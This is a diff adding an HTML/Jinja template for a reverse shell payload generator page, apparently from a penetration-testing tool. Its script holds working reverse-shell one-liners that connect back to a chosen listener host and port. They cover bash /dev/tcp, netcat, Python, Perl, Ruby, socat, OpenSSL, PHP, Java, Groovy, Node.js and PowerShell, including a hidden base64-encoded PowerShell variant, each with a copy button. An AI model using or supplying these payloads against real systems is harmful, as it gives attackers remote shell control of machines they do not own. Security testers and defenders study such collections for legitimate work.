@@ -1,0 +1,150 @@
+{% extends 'base.html' %}
+{% block title %}Payload Generator{% endblock %}
+{% block content %}
+{# All styles are now in style.css #}
+
+<div class="gen-container">
+  <div class="gen-header">
+    <h2>🔧 Reverse Shell Payload Generator</h2>
+    <p>Generate reverse shell commands for various platforms and languages. Set your listener IP &amp; port, then copy the payload.</p>
+  </div>
+  <div class="gen-body">
+    <div class="config-row">
+      <div class="config-field">
+        <label>Listener IP (LHOST)</label>
+        <input type="text" id="lhost" placeholder="e.g. 10.10.14.5" value="{{ server_ip }}" />
+      </div>
+      <div class="config-field">
+        <label>Listener Port (LPORT)</label>
+        <input type="number" id="lport" value="{{ port }}" min="1" max="65535" />
+      </div>
+      <div class="config-field">
+        <label>Shell Type</label>
+        <select id="shelltype">
+          <option value="/bin/bash">/bin/bash</option>
+          <option value="/bin/sh">/bin/sh</option>
+          <option value="cmd.exe">cmd.exe</option>
+          <option value="powershell">powershell</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="section-title">🐧 Linux / macOS</div>
+    <div class="payload-grid" id="unix-payloads"></div>
+
+    <div class="section-title">🪟 Windows</div>
+    <div class="payload-grid" id="win-payloads"></div>
+
+    <div class="section-title">🌐 Web / Scripting Languages</div>
+    <div class="payload-grid" id="web-payloads"></div>
+  </div>
+</div>
+
+<script>
+const PAYLOADS = {
+  unix: [
+    {name: "Bash -i", fn: (h,p,s) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`},
+    {name: "Bash (no -i)", fn: (h,p,s) => `bash -c 'exec 5<>/dev/tcp/${h}/${p}; cat <&5 | while read line; do $line 2>&5 >&5; done'`},
+    {name: "Netcat (nc -e)", fn: (h,p,s) => `nc -e ${s} ${h} ${p}`},
+    {name: "Netcat (mkfifo)", fn: (h,p,s) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${s} -i 2>&1|nc ${h} ${p} >/tmp/f`},
+    {name: "Ncat (SSL)", fn: (h,p,s) => `ncat --ssl ${h} ${p} -e ${s}`},
+    {name: "Python3", fn: (h,p,s) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${s}","-i"])'`},
+    {name: "Python2", fn: (h,p,s) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${s}","-i"])'`},
+    {name: "Perl", fn: (h,p,s) => `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${s} -i");};'`},
+    {name: "Ruby", fn: (h,p,s) => `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("${s} -i <&%d >&%d 2>&%d",f,f,f)'`},
+    {name: "socat", fn: (h,p,s) => `socat exec:'${s} -li',pty,stderr,setsid,sigint,sane tcp:${h}:${p}`},
+    {name: "Lua", fn: (h,p,s) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${h}','${p}');os.execute('${s} -i <&3 >&3 2>&3');"`},
+    {name: "OpenSSL", fn: (h,p,s) => `mkfifo /tmp/s; ${s} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${h}:${p} > /tmp/s; rm /tmp/s`},
+  ],
+  win: [
+    {name: "PowerShell (TCPClient)", fn: (h,p) => `$LHOST = "${h}"; $LPORT = ${p}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output\`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()`},
+    {name: "PowerShell (One-Liner)", fn: (h,p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`},
+    {name: "PowerShell (Base64)", fn: (h,p) => {
+      const cmd = `$client = New-Object System.Net.Sockets.TCPClient("${h}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+      // Encode as UTF-16LE base64 (PowerShell -EncodedCommand expects this)
+      const utf16le = new Uint8Array(cmd.length * 2);
+      for (let i = 0; i < cmd.length; i++) {
+        const code = cmd.charCodeAt(i);
+        utf16le[i * 2] = code & 0xff;
+        utf16le[i * 2 + 1] = (code >> 8) & 0xff;
+      }
+      let binary = '';
+      utf16le.forEach(b => binary += String.fromCharCode(b));
+      const b64 = btoa(binary);
+      return `powershell -nop -w hidden -enc ${b64}`;
+    }},
+    {name: "Windows Netcat (nc.exe)", fn: (h,p) => `nc.exe -e cmd.exe ${h} ${p}`},
+  ],
+  web: [
+    {name: "PHP (exec)", fn: (h,p,s) => `php -r '$sock=fsockopen("${h}",${p});exec("${s} -i <&3 >&3 2>&3");'`},
+    {name: "PHP (proc_open)", fn: (h,p,s) => `php -r '$sock=fsockopen("${h}",${p});$proc=proc_open("${s} -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`},
+    {name: "Java", fn: (h,p,s) => `Runtime r = Runtime.getRuntime();\nProcess p = r.exec(new String[]{"${s}","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done"});\np.waitFor();`},
+    {name: "Groovy", fn: (h,p,s) => `String host="${h}";int port=${p};String cmd="${s}";Process p=["${s}","-c",cmd+" -i >& /dev/tcp/"+host+"/"+port+" 0>&1"].execute();`},
+    {name: "Node.js", fn: (h,p,s) => `require('child_process').exec('nc -e ${s} ${h} ${p}')`},
+    {name: "Node.js (net)", fn: (h,p,s) => `(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("${s}", []);var client = new net.Socket();client.connect(${p}, "${h}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`},
+  ]
+};
+
+function getValues() {
+  return {
+    h: document.getElementById('lhost').value || 'LHOST',
+    p: document.getElementById('lport').value || '5000',
+    s: document.getElementById('shelltype').value
+  };
+}
+
+function renderPayloads() {
+  const {h, p, s} = getValues();
+  ['unix','win','web'].forEach(cat => {
+    const container = document.getElementById(cat === 'unix' ? 'unix-payloads' : cat === 'win' ? 'win-payloads' : 'web-payloads');
+    container.innerHTML = '';
+    PAYLOADS[cat].forEach((payload, idx) => {
+      const code = payload.fn(h, p, s);
+      const payloadId = cat + '-' + idx;
+      const card = document.createElement('div');
+      card.className = 'payload-card';
+
+      const header = document.createElement('div');
+      header.className = 'payload-card-header';
+
+      const langSpan = document.createElement('span');
+      langSpan.className = 'lang';
+      langSpan.textContent = payload.name;
+
+      const copyBtn = document.createElement('button');
+      copyBtn.className = 'copy-btn';
+      copyBtn.textContent = '📋 Copy';
+      copyBtn.addEventListener('click', function() { copyPayload(this, payloadId); });
+
+      header.appendChild(langSpan);
+      header.appendChild(copyBtn);
+
+      const codeDiv = document.createElement('div');
+      codeDiv.className = 'payload-code';
+      codeDiv.id = 'payload-' + payloadId;
+      codeDiv.textContent = code;
+
+      card.appendChild(header);
+      card.appendChild(codeDiv);
+      container.appendChild(card);
+    });
+  });
+}
+
+function copyPayload(btn, id) {
+  const el = document.getElementById('payload-' + id);
+  const text = el.textContent || el.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✅ Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = '📋 Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+document.getElementById('lhost').addEventListener('input', renderPayloads);
+document.getElementById('lport').addEventListener('input', renderPayloads);
+document.getElementById('shelltype').addEventListener('change', renderPayloads);
+
+renderPayloads();
+</script>
+{% endblock %}
